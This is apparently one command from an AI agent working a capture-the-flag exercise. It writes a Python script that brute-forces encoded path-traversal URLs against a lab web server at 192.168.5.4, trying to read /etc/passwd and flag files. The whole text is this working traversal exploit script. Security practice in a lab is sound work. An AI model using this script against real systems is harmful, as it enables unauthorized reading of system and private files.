commands.command:
cat <<'EOF' >/ctf-workspace/cgilab.py
import urllib.request
import urllib.error

base = 'http://192.168.5.4'
endpoints = ['', '/cgi-bin', '/cgi-bin/test-cgi']
segments = ['/.%2e', '/%2e%2e', '/%252e%252e']
targets = ['/etc/passwd', '/var/www/html/index.html', '/var/www/html/flag.txt', '/flag.txt', '/home/ctf/flag.txt', '/root/flag.txt']
max_depth = 6

def try_request(path):
    url = base + path
    req = urllib.request.Request(url, method='GET')
    try:
        with urllib.request.urlopen(req, timeout=5) as resp:
            body = resp.read(512)
        print(f"SUCCESS {url} -> {resp.status} (len={len(body)})")
        print(body.decode('utf-8', 'ignore'))
        return True
    except urllib.error.HTTPError as err:
        if err.code != 404:
            print(f"{url} -> {err.code}")
        return False
    except Exception as exc:
        print(f"{url} -> {exc}")
        return False

for endpoint in endpoints:
    for seg in segments:
        prefix = ''
        for depth in range(1, max_depth + 1):
            prefix += seg
            for target in targets:
                if try_request(endpoint + prefix + target):
                    raise SystemExit
EOF

